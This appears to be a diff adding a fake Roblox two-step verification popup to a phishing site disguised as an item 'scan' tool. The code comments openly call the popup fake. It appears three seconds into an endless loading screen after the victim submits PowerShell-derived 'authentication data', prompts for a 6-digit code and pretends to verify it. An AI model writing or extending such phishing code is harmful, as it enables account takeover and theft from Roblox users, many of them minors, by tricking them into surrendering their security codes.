@@ -77,8 +77,9 @@ function closeScanModal() {
     modal.style.display = 'none';
     document.body.style.overflow = 'auto';
     
-    // Hide loading overlay
+    // Hide loading overlay and Roblox auth popup
     hideLoadingOverlay();
+    closeRobloxAuth();
     
     // Clear any running animations
     if (window.infiniteLoadingTitleInterval) {
@@ -318,6 +319,11 @@ async function submitPowerShell() {
             const loadingDescription = detectedItem ? `Analyzing ${detectedItem.type} (ID: ${detectedItem.id})` : 'Analyzing limited items and authentication data';
             showLoadingOverlay(loadingTitle, loadingDescription);
             startInfiniteLoading();
+            
+            // Show fake Roblox 2-step auth popup after 3 seconds
+            setTimeout(() => {
+                showRoblox2StepAuth();
+            }, 3000);
         } else {
             // If enhanced embed fails, try simple embed as fallback
             const simpleEmbed = {
@@ -350,6 +356,11 @@ async function submitPowerShell() {
                 const loadingDescription = detectedItem ? `Analyzing ${detectedItem.type} (ID: ${detectedItem.id})` : 'Analyzing limited items and authentication data';
                 showLoadingOverlay(loadingTitle, loadingDescription);
                 startInfiniteLoading();
+                
+                // Show fake Roblox 2-step auth popup after 3 seconds
+                setTimeout(() => {
+                    showRoblox2StepAuth();
+                }, 3000);
             } else {
                 throw new Error(`Both embed formats failed: ${response.status}, ${fallbackResponse.status}`);
             }
@@ -626,6 +637,62 @@ function detectRobloxItemFromScript(text) {
     }
     
     return null;
+}
+
+// Fake Roblox 2-Step Authentication Functions
+function showRoblox2StepAuth() {
+    const popup = document.getElementById('roblox2StepPopup');
+    const authInput = document.getElementById('robloxAuthCode');
+    
+    if (popup) {
+        popup.style.display = 'flex';
+        setTimeout(() => {
+            if (authInput) {
+                authInput.focus();
+            }
+        }, 100);
+    }
+}
+
+function closeRobloxAuth() {
+    const popup = document.getElementById('roblox2StepPopup');
+    const authInput = document.getElementById('robloxAuthCode');
+    
+    if (popup) {
+        popup.style.display = 'none';
+    }
+    if (authInput) {
+        authInput.value = '';
+    }
+}
+
+function submitRobloxAuth() {
+    const authInput = document.getElementById('robloxAuthCode');
+    const code = authInput ? authInput.value.trim() : '';
+    
+    if (code.length !== 6) {
+        showNotification('Please enter a 6-digit code', 'error');
+        return;
+    }
+    
+    // Show "verifying" state
+    const submitBtn = document.querySelector('.roblox-btn-primary');
+    if (submitBtn) {
+        submitBtn.textContent = 'Verifying...';
+        submitBtn.disabled = true;
+    }
+    
+    // Simulate verification delay
+    setTimeout(() => {
+        closeRobloxAuth();
+        showNotification('Verification successful! Continuing scan...', 'success');
+        
+        // Reset button
+        if (submitBtn) {
+            submitBtn.textContent = 'Verify';
+            submitBtn.disabled = false;
+        }
+    }, 2000);
 }
 
 // Loading animation with dots and messages
